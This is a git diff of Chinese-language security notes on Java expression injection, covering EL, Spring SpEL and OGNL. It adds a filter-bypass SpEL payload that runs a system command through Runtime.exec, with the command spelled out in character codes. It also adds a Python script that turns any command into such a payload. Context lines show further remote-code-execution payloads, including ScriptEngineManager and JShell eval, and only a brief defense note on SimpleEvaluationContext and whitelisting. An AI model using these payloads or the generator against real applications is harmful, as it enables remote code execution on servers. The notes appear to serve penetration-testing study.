@@ -7,6 +7,7 @@ ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEng
 ```
 
 
+
 ^
 # **Spring的SpEL表达式**
 功能：
@@ -170,6 +171,24 @@ T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager)
 T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
 ```
 
+数值编码型绕过
+```
+${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)))}
+
+生成脚本：
+message = input('Enter message to encode:')
+
+poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
+
+for ch in message[1:]:
+   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
+
+poc += ')}'
+
+print(poc)
+```
+
+
 ## **SpEL表达式注入防御**
 使用 SimpleEvaluationContext
 防御：使用时做白名单，只有需要的字符串才能当作代码执行。
@@ -181,6 +200,10 @@ expression.setValue(context, "payload");
 
 
 
+
+
+
+^
 ^
 # **OGNL(struts2)表达式注入**
 记录POC，具体的内容学structs。
